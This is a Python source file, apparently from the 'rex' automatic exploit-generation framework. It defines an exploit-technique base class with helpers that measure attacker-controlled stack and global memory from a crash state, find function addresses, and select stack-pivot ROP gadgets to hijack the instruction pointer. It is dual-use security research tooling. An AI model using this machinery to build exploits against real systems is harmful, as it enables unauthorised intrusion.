import logging
from rex.exploit import CannotExploit

l = logging.getLogger("rex.exploit.technique")

class Technique(object):
    '''
    Represents an exploit techinue
    '''

    applicable_to = [ ]

    def __init__(self, crash, rop, shellcode):
        '''
        :param crash: a crash object representing the state at crash time
        :param rop: an angr rop object for finding and requesting chains
        :param shellcode: a shellcode manager to query for shellcode
        '''

        self.crash = crash.copy()
        self.rop = rop
        self.shellcode = shellcode

    def apply(self, **kwargs):
        '''
        Applies the exploit technique to the crashing state, returns a working exploit in Payload
        or raises a CannotExploit exception
        :return: a Payload object
        '''

        raise NotImplementedError


### EXPLOIT HELPERS ###

    def _stack_control(self):
        '''
        determine what symbolic memory we control equal to or beneath sp
        '''

        control = { }

        if self.crash.state.se.symbolic(self.crash.state.regs.sp):
            l.warning("detected symbolic sp when guaging stack control")
            return control

        sp = self.crash.state.se.any_int(self.crash.state.regs.sp)
        for addr in self.crash.symbolic_mem:
            # if the region is above sp it gets added
            if addr > sp:
                control[addr] = self.crash.symbolic_mem[addr]

            # if sp falls into the region it gets added starting at sp
            if sp <= addr + self.crash.symbolic_mem[addr]:
                control[sp] = addr + self.crash.symbolic_mem[addr] - sp

        return control


    def _global_control(self):
        '''
        determine what symbolic memory we control which is at a constant address
        '''

        control = { }

        # PIE binaries will give no global control without knowledge of the binary base
        if self.crash.project.loader.main_bin.pic:
            return control

        min_addr = self.crash.project.loader.main_bin.get_min_addr()
        max_addr = self.crash.project.loader.main_bin.get_max_addr()
        for addr in self.crash.symbolic_mem:
            if addr >= min_addr and addr < max_addr:
                control[addr] = self.crash.symbolic_mem[addr]

        return control

    def _write_global_data(self, data):
        '''
        write @data into globally addressable memory
        :return: tuple of the address of the string and the constraint which adds the string
        '''
        glob_control = self._global_control()

        # try all variations of commands at every global address
        for base in glob_control:
            for addr in range(base, base+glob_control[base]):
                constraint = self.crash.state.memory.load(addr, len(data)) == self.crash.state.BVV(data)
                if self.crash.state.se.satisfiable(extra_constraints=(constraint,)):
                    data_str_addr = addr
                    data_str_constraint = constraint
                    return (data_str_addr, data_str_constraint)

        return (None, None)

    def _find_func_address(self, symbol):
        '''
        find the address of a function given it's name @symbol
        :param symbol: function name to lookup
        :return: the function's address or None if the function is not present
        '''

        address = None
        symobj = self.crash.project.loader.main_bin.get_symbol(symbol)
        if symbol in self.crash.project.loader.main_bin.plt:
            address = self.crash.project.loader.main_bin.plt[symbol]
        elif symobj is not None:
            address = symobj.addr + self.crash.project.loader.main_bin.rebase_addr

        return address

    def _ip_overwrite_with_chain(self, chain, state=None):
        '''
        exploit an ip overwrite using rop
        :param chain: rop chain to use
        :param state: an optionally state to work off of
        '''

        if state is None:
            state = self.crash.state

        sp = state.se.any_int(state.regs.sp)

        # first let's see what kind of stack control we have
        symbolic_stack = self._stack_control()
        if len(symbolic_stack) == 0:
            l.warning("no controlled data beneath stack, need to resort to shellcode")
            raise CannotExploit("no controlled data beneath sp")

        chain_addr = None
        stack_pivot = None
        # loop until we can find a chain which gets us to our setter gadget
        for addr in symbolic_stack:
            # increase payload length by 4 for the final ip hijack
            chain_req = chain.payload_len + 4

            # is the space too small?
            if not symbolic_stack[addr] >= chain_req:
                continue

            # okay we have a symbolic region which fits and is below sp
            # can we pivot there?
            for gadget in self.rop.gadgets:
                # let's make sure the gadget is sane

                # TODO: consult state before throwing out a gadget, some of these memory
                # accesses might be acceptable
                if len(gadget.mem_changes + gadget.mem_writes + gadget.mem_reads) > 0:
                    continue

                # if we assume all gadgets end in a 'ret' we can subtract 4 from the stack_change
                # as we're not interested in the ret's effect on stack movement, because when the
                # ret executes we'll have chain control
                jumps_to = sp + (gadget.stack_change - 4)
                # does it hit the controlled region?
                if jumps_to >= addr and jumps_to < addr + symbolic_stack[addr]:
                    # it lands in a controlled region, but does our chain fit?
                    offered_size = symbolic_stack[addr] - (jumps_to - addr)
                    if offered_size >= chain_req:
                        # we're in!
                        chain_addr = jumps_to
                        stack_pivot = gadget

                        # test to see if things are still satisfiable
                        chain_constraints = [ ]

                        chain_constraints.append(state.regs.ip == stack_pivot.addr)
                        mem = state.memory.load(chain_addr, chain.payload_len)

                        cbvv = state.BVV(chain.payload_str())
                        chain_constraints.append(mem == cbvv)

                        # if the chain can't be placed here, let's try again
                        if not state.satisfiable(extra_constraints=chain_constraints):
                            continue

                        # constrain eip to equal the stack_pivot
                        state.add_constraints(state.regs.ip == stack_pivot.addr)
                        return (state, chain_addr, offered_size)

        raise CannotExploit("unable to insert chain")
